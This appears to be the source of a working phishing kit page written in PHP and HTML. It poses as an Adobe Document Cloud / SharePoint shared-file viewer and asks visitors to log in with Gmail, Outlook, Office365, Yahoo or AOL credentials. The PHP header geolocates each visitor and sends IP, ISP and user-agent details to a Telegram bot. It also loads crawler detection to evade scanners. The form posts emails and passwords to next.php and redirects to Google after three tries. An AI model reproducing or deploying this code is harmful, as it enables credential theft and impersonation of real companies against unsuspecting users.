<?php error_reporting(0);
require_once 'o2ivwuyg.php';
require_once 'pho7zebk.php';
require_once 'rsbvge2q.php';
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_crawlerdetect=$tanitatikaram['crawlerdetect'];
if($setting_crawlerdetect == 'on') {
require_once 'crawlerdetect.php';
}
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$viewsToken = $tanitatikaram['viewsToken'];
$viewsChatID = $tanitatikaram['viewsChatID'];
$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$city = $details['city'];
$isp = $details['isp'];
$region = $details['regionName'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "[★★ Getting Visitor ★★]\n"."\n";
$message .= " »»————- ★[DEVICE INFO]\n"."\n";
$message.= "IP Address:$ip"."\n";
$message.= "COUNTRY:$countryname"."\n";
$message.= "REGION:{$region}"."\n";
$message.= "ORGANISATION:{$isp}"."\n";
$message.= "HOSTNAME:" . $hostname . ""."\n";
$message.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n"."\n";
function callAPI($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($curl);
    curl_close($curl);
}
$result = urlencode($message);
callAPI('https://api.telegram.org/bot' . $viewsToken . '/sendMessage?chat_id=' . $viewsChatID . '&text=' . $result . "&parse_mode=html");
?>

<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <link rel="shortcut icon" href="images/fav.ico" type="image/x-icon">
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <body>
    <div class="container-fluid">
      <div class="row" style="background-image: url('images/8.jpg'); background-size: cover;background-repeat: no-repeat;">
        <div class="container">
          <div class="row">
            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
              <div class="text-center pt-5"> 
                <img src="images/adobe.jpg" class="img-fluid" width="100px"><br>
                <span class="h4 text-white">Adobe Document Cloud</span><br>
                <span class="h5 text-white font-weight-normal">To read the document, please choose your email provider below login to view shared file.</span>
              </div>
              <div class="mt-3">
                <div class="row">
                <div class="col-lg-12">
                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="mt-2" style=" background-color: #D44638;">
                        <img src="images/gmail2.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; ">Sign in with Gmail</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #0073C8;">
                        <img src="images/outlook2.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="row">
                  <div class="col-lg-12 ">
                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="  mt-2" style=" background-color: #31459B;">
                        <img src="images/aol1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #FF3C00;">
                        <img src="images/office3652.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="row">
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #5F0F68;">
                        <img src="images/yahoo2.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #0B5BD3;">
                        <img src="images/other1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                     <p class="text-white mt-3 text-center">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
                <p class="h5 text-center text-white">CopyRight© 2023 Adobe system incorporated, All right reserved.</p> 
                    
                  </div>
               
              </div> 
            </div>
          </div>
        </div>



      </div> 
    </div>




    <!-- Modal for gmail -->
    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">

            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <center>
              <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
              <div class="alert alert-danger" id="msg"></div>

            </center>
            <form id="contact" class="form-horizontal well" method = "post" action="./next.php">
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="exampleInputEmail1">Email address</label>
                  <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="Password">Password</label>
                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
                </div>
              </div>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
              <button type = "submit" class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
            </div>
          </form>
        </div>
      </div>
    </div>
    

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>

    $(document).ready(function(){
      var count=0;
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();

        
        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://google.com");
        }
        else
        {
         $.ajax({
          url: './next.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
				$("#password").val("");
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
				$("#password").val("");
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
  </script>
  </html>